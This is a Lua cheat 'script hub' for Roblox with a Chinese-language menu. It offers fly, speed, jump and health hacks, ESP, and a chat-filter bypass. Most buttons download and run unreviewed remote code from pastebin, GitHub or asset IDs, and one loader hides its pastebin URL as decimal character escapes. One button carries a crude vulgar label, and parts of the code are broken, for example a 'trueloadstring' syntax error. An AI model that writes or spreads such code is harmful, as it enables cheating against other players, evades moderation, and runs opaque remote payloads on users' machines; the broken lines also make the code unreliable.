local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/jensonhirst/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "普京脚本中心", HidePremium = false, SaveConfig = true, ConfigFolder = "PutinScriptsHub"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]
local Tab = Window:MakeTab({
	Name = "通用",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
local Section = Tab:AddSection({
	Name = "运动型"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddButton({
	Name = "飞行脚本",
	Callback = function()
      		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddButton({
	Name = "普京设置",
	Callback = function()
      		local Gui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local ToggleButton = Instance.new("TextButton")

-- 初始化全局状态
local dragStates = {
    currentSlider = nil,
    draggingToggle = false
}

-- 主界面设置
Gui.Name = "SettingsGui"
Gui.ResetOnSpawn = false 
Gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

MainFrame.Parent = Gui 
MainFrame.Size = UDim2.new(0, 320, 0, 260)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -130)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BorderSizePixel = 2
MainFrame.BorderColor3 = Color3.fromRGB(80, 80, 80)
MainFrame.ClipsDescendants = true

-- 增强型滑动条组件
local function createEnhancedSlider(parent, name, position)
    local slider = Instance.new("Frame", parent)
    slider.Name = name
    slider.Size = UDim2.new(0.9, 0, 0, 40)  -- 增大操作区域
    slider.Position = position
    slider.BackgroundTransparency = 1
    
    -- 标签文本
    local label = Instance.new("TextLabel", slider)
    label.Size = UDim2.new(0.5, 0, 0.5, 0)
    label.Position = UDim2.new(0, 0, 0.1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(200, 200, 200)
    label.Text = name
    label.Font = Enum.Font.GothamMedium
    label.TextSize = 14
    label.TextXAlignment = Enum.TextXAlignment.Left

    -- 滑动条轨道
    local track = Instance.new("Frame", slider)
    track.Name = "Track"
    track.Size = UDim2.new(1, 0, 0.4, 0)
    track.Position = UDim2.new(0, 0, 0.6, 0)
    track.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    track.BorderSizePixel = 0
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    -- 滑动条填充
    local fill = Instance.new("Frame", track)
    fill.Name = "Fill"
    fill.Size = UDim2.new(0.5, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(80, 80, 200)
    fill.BorderSizePixel = 0
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

    -- 滑动块
    local thumb = Instance.new("TextButton", track)
    thumb.Name = "Thumb"
    thumb.Size = UDim2.new(0, 24, 1.5, 0)
    thumb.Position = UDim2.new(0.5, -12, -0.25, 0)
    thumb.BackgroundColor3 = Color3.fromRGB(160, 40, 160)
    thumb.Text = ""
    thumb.AutoButtonColor = false
    thumb.BorderSizePixel = 0
    Instance.new("UICorner", thumb).CornerRadius = UDim.new(1, 0)

    -- 数值显示
    local valueLabel = Instance.new("TextLabel", slider)
    valueLabel.Size = UDim2.new(0.3, 0, 0.5, 0)
    valueLabel.Position = UDim2.new(0.7, 0, 0.1, 0)
    valueLabel.BackgroundTransparency = 1
    valueLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    valueLabel.Text = "100"
    valueLabel.Font = Enum.Font.GothamMedium
    valueLabel.TextSize = 14
    valueLabel.TextXAlignment = Enum.TextXAlignment.Right

    return slider, thumb, valueLabel
end

-- 创建滑动控制器
local function createSliderController()
    local controller = {
        sliders = {},
        connections = {}
    }

    function controller:addSlider(slider, thumb, label, min, max, callback)
        local data = {
            slider = slider,
            thumb = thumb,
            label = label,
            min = min,
            max = max,
            callback = callback
        }
        table.insert(self.sliders, data)
    end

    function controller:init()
        local UIS = game:GetService("UserInputService")
        
        -- 全局输入监听
        self.connections.inputEnded = UIS.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragStates.currentSlider = nil
                dragStates.draggingToggle = false
            end
        end)

        -- 全局帧循环更新
        self.connections.renderStep = game:GetService("RunService").RenderStepped:Connect(function()
            if dragStates.currentSlider then
                local data = dragStates.currentSlider
                local mousePos = UIS:GetMouseLocation()
                local track = data.slider.Track
                local absoluteX = track.AbsolutePosition.X
                local trackWidth = track.AbsoluteSize.X
                local percent = math.clamp((mousePos.X - absoluteX) / trackWidth, 0, 1)
                local value = math.floor(data.min + (data.max - data.min) * percent)

                data.thumb.Position = UDim2.new(percent, -12, -0.25, 0)
                track.Fill.Size = UDim2.new(percent, 0, 1, 0)
                data.label.Text = tostring(value)
                data.callback(value)
            end
        end)
    end

    return controller
end

-- 创建滑动条（带标签）
local sliderController = createSliderController()
local JumpSlider, JumpThumb, JumpValue = createEnhancedSlider(MainFrame, "跳跃高度", UDim2.new(0.05, 0, 0.15, 0))
local SpeedSlider, SpeedThumb, SpeedValue = createEnhancedSlider(MainFrame, "移动速度", UDim2.new(0.05, 0, 0.35, 0))
local HealthSlider, HealthThumb, HealthValue = createEnhancedSlider(MainFrame, "生命值", UDim2.new(0.05, 0, 0.55, 0))

-- 汉化按钮
local RestoreButton = Instance.new("TextButton")
RestoreButton.Parent = MainFrame 
RestoreButton.Size = UDim2.new(0.8, 0, 0.12, 0)
RestoreButton.Position = UDim2.new(0.1, 0, 0.75, 0)
RestoreButton.Text = "恢复全部生命值"
RestoreButton.BackgroundColor3 = Color3.fromRGB(40, 120, 40)
RestoreButton.TextColor3 = Color3.fromRGB(255, 255, 255)
RestoreButton.Font = Enum.Font.GothamBold

-- 隐藏/显示按钮
local HideButton = Instance.new("TextButton")
HideButton.Parent = MainFrame
HideButton.Size = UDim2.new(0.15, 0, 0.1, 0)
HideButton.Position = UDim2.new(0.85, 0, 0.02, 0)
HideButton.Text = "×"
HideButton.TextColor3 = Color3.fromRGB(255, 80, 80)
HideButton.BackgroundTransparency = 1
HideButton.Font = Enum.Font.GothamBlack
HideButton.TextSize = 24

-- 玩家状态管理器
local function createPlayerState()
    local state = {
        humanoid = nil,
        connections = {}
    }

    function state:init(character)
        if self.humanoid then
            for _, conn in pairs(self.connections) do
                conn:Disconnect()
            end
        end

        self.humanoid = character:WaitForChild("Humanoid")
        
        -- 自动重新初始化滑动条
        sliderController:addSlider(JumpSlider, JumpThumb, JumpValue, 50, 200, function(value)
            self.humanoid.JumpPower = value
        end)
        
        sliderController:addSlider(SpeedSlider, SpeedThumb, SpeedValue, 16, 100, function(value)
            self.humanoid.WalkSpeed = value
        end)
        
        sliderController:addSlider(HealthSlider, HealthThumb, HealthValue, 100, 200, function(value)
            self.humanoid.MaxHealth = value
            self.humanoid.Health = value
        end)

        -- 初始化数值显示
        JumpValue.Text = tostring(self.humanoid.JumpPower)
        SpeedValue.Text = tostring(self.humanoid.WalkSpeed)
        HealthValue.Text = tostring(self.humanoid.MaxHealth)
    end

    return state
end

-- 创建可拖动切换按钮
local function createDraggableToggle()
    local button = Instance.new("TextButton")
    button.Name = "普京脚本"
    button.Size = UDim2.new(0, 60, 0, 60)
    button.Position = UDim2.new(1, -70, 1, -70)
    button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    button.TextColor3 = Color3.fromRGB(200, 200, 200)
    button.Text = "普京\n脚本"
    button.Font = Enum.Font.GothamMedium
    button.TextSize = 14
    button.TextWrapped = true
    button.BorderSizePixel = 0
    button.Visible = false
    button.Active = true
    button.Draggable = true
    
    -- 圆形效果
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = button
    
    -- 拖动功能
    local dragStartPos, buttonStartPos
    
    button.MouseButton1Down:Connect(function()
        dragStartPos = Vector2.new(Mouse.X, Mouse.Y)
        buttonStartPos = button.Position
        dragStates.draggingToggle = true
    end)
    
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragStates.draggingToggle then
            local delta = Vector2.new(Mouse.X, Mouse.Y) - dragStartPos
            button.Position = UDim2.new(
                buttonStartPos.X.Scale,
                buttonStartPos.X.Offset + delta.X,
                buttonStartPos.Y.Scale,
                buttonStartPos.Y.Offset + delta.Y
            )
        end
    end)

    return button
end

-- 初始化系统
local playerState = createPlayerState()
local toggleButton = createDraggableToggle()
toggleButton.Parent = Gui

-- 连接滑动条控制器
sliderController:init()

-- 为滑动条添加交互
JumpThumb.MouseButton1Down:Connect(function()
    dragStates.currentSlider = {
        slider = JumpSlider,
        thumb = JumpThumb,
        label = JumpValue,
        min = 50,
        max = 200,
        callback = function(value)
            if playerState.humanoid then
                playerState.humanoid.JumpPower = value
            end
        end
    }
end)

SpeedThumb.MouseButton1Down:Connect(function()
    dragStates.currentSlider = {
        slider = SpeedSlider,
        thumb = SpeedThumb,
        label = SpeedValue,
        min = 16,
        max = 100,
        callback = function(value)
            if playerState.humanoid then
                playerState.humanoid.WalkSpeed = value
            end
        end
    }
end)

HealthThumb.MouseButton1Down:Connect(function()
    dragStates.currentSlider = {
        slider = HealthSlider,
        thumb = HealthThumb,
        label = HealthValue,
        min = 100,
        max = 200,
        callback = function(value)
            if playerState.humanoid then
                playerState.humanoid.MaxHealth = value
                playerState.humanoid.Health = value
            end
        end
    }
end)

-- 角色生命周期管理
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    playerState:init(character)
end)

-- 初始角色绑定
if game.Players.LocalPlayer.Character then
    playerState:init(game.Players.LocalPlayer.Character)
end

-- 按钮功能
RestoreButton.MouseButton1Click:Connect(function()
    if playerState.humanoid then
        playerState.humanoid.Health = playerState.humanoid.MaxHealth
    end
end)

HideButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
    toggleButton.Visible = true
end)

toggleButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = true
    toggleButton.Visible = false
end)

-- 初始状态
toggleButton.Visible = false
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddButton({
	Name = "操操逼",
	Callback = function()
      		loadstring(game:HttpGet(('https://pastebin.com/raw/ZfaM6tNg'),true))()
  	end    
})
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Section = Tab:AddSection({
	Name = "视觉型"
})

--[[
Name = <string> - The name of the section.
]]
Tab:AddButton({
	Name = "透视脚本",
	Callback = function()
      		loadstring(game:GetObjects("rbxassetid://10092697033")[1].Source)()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddButton({
	Name = "夜视仪脚本",
	Callback = function()
      		_G.OnShop = trueloadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
Tab:AddButton({
	Name = "骂人不违规",
	Callback = function()
      		loadstring(game:GetObjects("rbxassetid://1262435912")[1].Source)()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]